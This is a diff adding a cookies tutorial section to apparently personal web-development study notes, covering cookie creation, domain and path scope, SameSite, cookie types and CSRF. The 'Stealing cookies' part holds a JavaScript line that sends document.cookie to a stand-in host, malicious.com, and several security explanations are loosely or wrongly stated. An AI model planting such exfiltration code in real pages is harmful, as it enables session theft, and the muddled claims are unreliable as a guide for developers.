@@ -1,6 +1,184 @@
-[HTTP](#HTTP)
+[Cookies](#cookies)
+1. [HTTP Cookies Crash Course](https://youtu.be/sovAIX4doOE)
+    1. [Create Cookies](#create-cookies)
+    1. [Cookie Properties](#cookie-properties)
+        1. [Cookie Scope](#cookies-scope)
+            1. [Domain](#domain)
+            1. [Path](#path)
+        1. [Same Site](#same-site)
+    1. [Cookie Types](#cookie-types)
+        1. [Session cookie](#session-cookie)
+        1. [Permanent cookie](#permanent-cookie)
+        1. [Httponly cookie](#httponly-cookie)
+        1. [Secure cookie](#secure-cookie)
+        1. [Third party cookie](#third-party-cookie)
+        1. [Zombie cookie](#zombie-cookie)
+    1. [Cookie Security](#cookie-security)
+        1. [Stealing cookies](#stealing-cookies)
+        1. [Cross site request forgery](#cross-site-request-forgery)
+
+[HTTP](#http)
 1. [HTTP Crash Course & Exploration](https://youtu.be/iYM2zFP3Zn0)
 ---
+# Cookies
+- Reference [HTTP Cookies Crash Course](https://youtu.be/sovAIX4doOE)
+## Create Cookies
+1. Cookies can be set either on server or client side.
+    1. Client - JavaScript `document.cookie`
+        ```js
+        // JavaScript
+        document.cookie="foo=bar";
+        ```
+        ```html
+        <!-- HTML -->
+        <!DOCTYPE html>
+        <html lang="en">
+
+        <head>
+            <meta charset="UTF-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=edge">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Document</title>
+        </head>
+
+        <body>
+            <button id="btnCreateCookie">Create Cookie</button>
+            <script>
+                const btnCreateCookie = document.querySelector('#btnCreateCookie');
+                btnCreateCookie.addEventListener('click', (event) => {
+                    document.cookie = "foo=bar";
+                })
+            </script>
+        </body>
+
+        </html>
+        ```
+    1. Server - `set-cookie` header
+        ```js
+        // express server
+        app.get('/', (req, res) => {
+            // set cookies in response
+            res.setHeader('set-cookie', [`setfromserver=1`]);
+            res.sendFile(`${__dirname}/index.html`);
+        });
+        ```
+1. When setting cookies from server-side, we can check in the developer console
+    <img src="./images/cookies_setCookiesFromServer.png">
+
+## Cookie Properties
+1. Cookies are sent with every request.
+    1. We can check the details in "Cookie" > "request" > "Network" in developer console.
+        <img src="./images/cookies_requestWithAllCookies.png">
+    1. We if clear the cookies of a domain bucket, no "Cookie" property will be in the header when sending requests.
+
+### Cookies Scope
+1. Cookies can be scoped by [`Domain`](#domain) and [`Path`](#path).
+
+#### Domain
+1. We can check `Cookies` in `Application` in developer console that cookies are stored in a "bucket" which is scoped by "domain".
+1. In addition, we can set "path" for cookies optionally, so we can send certain cookies when sending request to a specific route.
+1. When we change the domain, even a sub-domain from the same host or main domain, the cookies won't be shared.
+1. However, we can add a property `domain` when create a cookie with value such as `.example.com` which will make the cookie available for all the sub-domains from `example.com`.
+    ```js
+    // client JS
+    document.cookie = "foo=bar; domain=.example.com";
+    // both example.com and www.example.com can access foo=bar
+    ```
+
+#### Path
+1. Besides `domain`, we can set another property `path` when creating cookies.
+    ```js
+    // server JS
+    app.get('/path1', (req, res) => {
+        res.send(`Path 1: I have been sent these cookies ${req.headers.cookie}`);
+    });
+
+    app.get('/path2', (req, res) => {
+        res.send(`Path 2: I have been sent these cookies ${req.headers.cookie}`);
+    });
+    ```
+    ```js
+    // client JS
+    document.cookie = "john=doe; path=/path1";
+    document.cookie = "jane=doe; path=/path2";
+    ```
+1. When we visit different path, we can only get path only cookies and universal cookie for the domain.
+1. By grouping cookies with `domain` and `path`, we can increase security, reduce bandwith when transferring data, and limit data leakage.
+
+### Expires, Max-age
+1. A cookie will be destroied when the browser is closed if it's session-based and no `max-age` is given.
+1. We can give `max-age` as the property when creating a cookie. This property takes values as seconds. For example, if we'd like the cookie set alive for 1 min, we can give `max-age=60`.
+1. The cookie will be removed from the bucket automatically when it's expired.
+    ```js
+    // client JS
+    document.cookie = "tempcookie=9; max-age=60"; // this cookie alives only 1 min
+    ```
+
+### Same site
+1. As user credentials can be stored in cookies for authentication, cross site request forgery can be made if there's no limitation on cross site request sharing. 
+1. This forgery request can be done as all cookies will be sent along with the requests that the browser make.
+1. This is the main reason why it's recommended to regular users that DO NOT click suspicious links. This can allow external users access credentials cookies and forge user requests.
+1. This also explains why the user experience and process to authenticate online banking services are very unfriendly, and the login sessions usually alives only a short period of time, such as 20 mins.
+1. However, this also depends on the security design of the service providers if they have unsecure authentication process.
+    1. For example, a phising link can be a `GET` request with parameters to take action request on certain service such as transferring money.
+    1. If the user has ever logged in and been authenticated that credentials or access token is stored in cookies, the credential cookies will be send along with the request to the service. 
+    1. This is another reason why most of the modern APIs won't take `GET` request for actions to prevent forgery requests.
+1. To ensure the cookie will be sent along the request when the users are requesting from the same site, we can give `samesite=strict` when creating the cookie. 
+    ```js
+    document.cookie = "samesitecookie=1; samesite=strict"
+    ```
+1. Note that the default value for `samesite` is `lax` which will send the cookie when along all the requests to the domain or path.
+
+## Cookie Types
+### Session cookie
+1. Session cookies alive with the user session. When the browser is closed or the user session expires, the cookie will expire and be removed.
+1. This is the default property which in mostly in the examples above.
+
+### Permanent cookie
+1. This keeps cookies alive that doesn't have `max-age` or won't expire.
+
+### Httponly cookie
+1. This type of cookies can only be served by server and the client CAN NOT read the cookie.
+    ```js
+    // server JS
+    app.get('/', (req, res) => {
+        res.setHeader('set-cookie', [`setfromserver=1`, `jscantseethis=1; httponly`]);
+        res.sendFile(`${__dirname}/index.html`);
+    });
+    ```
+1. If we call `document.cookie` in the browser console, the `httponly` cookie won't be read and retrieved. This simply prevents JavaScript to access the cookie.
+1. Note that though this cookie can't be parsed by JavaScript, it is still a cookie and will be sent along with requests.
+
+### Secure cookie
+1. Secure cookies are only available if the website uses SSL with HTTPS.
+
+### Third party cookie
+1. This is having cookies provided by a 3rd party send along with requests.
+1. This is useful for marketing and advertising services. For example, Google may provide ads on a website and provides commission to the website owner.
+1. Note that cookies consider domains with different ports as the same domain (though origin is different). However, alias such as `localhost` with `127.0.0.1` will be treated as different domain.
+
+### Zombie cookie
+1. Zombie cookies will respawn themselves with the same values though being removed. 
+
+## Cookie Security
+### Stealing cookies
+1. If a cookie isn't assigned with `samesite` property, it can be fetched and manipulated by JavaScript. 
+1. For example, we can use JavaScript to change the `href` link of a hyper link and send the cookies to other servers.
+1. The following code will send all the cookies to an external link as GET requset in `cookies` parameter.
+    ```html
+    <a id="steal">Steal cookie</a>
+    ```
+    ```js
+    // client JS
+    const stealBtn = document.querySelector('steal');
+    stealBtn.href = `http://malicious.com/steal?cookies=${document.cookie}`;
+    ```
+
+### Cross site request forgery
+1. This condition is explained in [Same Site](#same-site) that a malicious website can create a link and pretend the user to make requests with unsecured cookies. 
+1. If the service application doesn't have enough security, it may take the forgery request as a valid user request. 
+
+
 # HTTP
 - Reference 
     1. [HTTP Crash Course & Exploration](https://youtu.be/iYM2zFP3Zn0)
